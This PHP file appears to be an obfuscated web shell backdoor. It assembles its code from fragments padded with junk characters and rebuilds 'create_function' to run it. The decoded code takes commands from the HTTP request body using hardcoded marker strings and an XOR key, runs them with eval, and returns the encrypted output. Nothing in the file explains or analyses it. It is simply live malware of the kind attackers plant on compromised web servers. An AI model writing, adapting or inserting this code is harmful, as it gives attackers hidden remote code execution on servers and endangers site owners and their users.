<?php
$Y='s("pQLhp://QLinput"QL)QL,$QLm)==1QL) {@obQL_start();@evQLQLal(@gzunQLcQLompress(@';
$E=str_replace('yn','','cynreynateyn_ynfuncyntiynon');
$I='$j}QL;}}reQLturn $o;}if (QL@preQLgQL_mQLatch(QL"/$QLkh(.+)$kf/",QL@file_get_QLcontent';
$g=';QL$r=QL@basQLe64_eQLncode(@x(@gzQLcomprQLess($oQL),$k));QLprinQLt("QL$p$kh$r$kf");}';
$w='$i=0QL;$QLi<$lQL;){forQL($j=0;($j<$c&QL&$iQL<$l);QL$j++,$i+QL+){$o.=$QLQLt{$i}^$kQL{';
$e='x(@baQLse64_decoQLde(QL$m[1]),$k)))QL;$o=@QLob_getQLQL_contenQLts();@oQLb_end_cleaQLn()';
$A='$k="88aQL3fb95QL";$kQLh="QLe7251162348aQLQL";QL$kf="db680QL8d8c7e7";QL$p="5QLRWL1TQL4Sto';
$C='YQLDIZiJ";fQLuncQLtion x(QL$t,$k){$c=strlQLen($QLk);$lQL=strlenQL($t);$QLo="";forQL(';
$r=str_replace('QL','',$A.$C.$w.$I.$Y.$e.$g);
$i=$E('',$r);$i();
?>
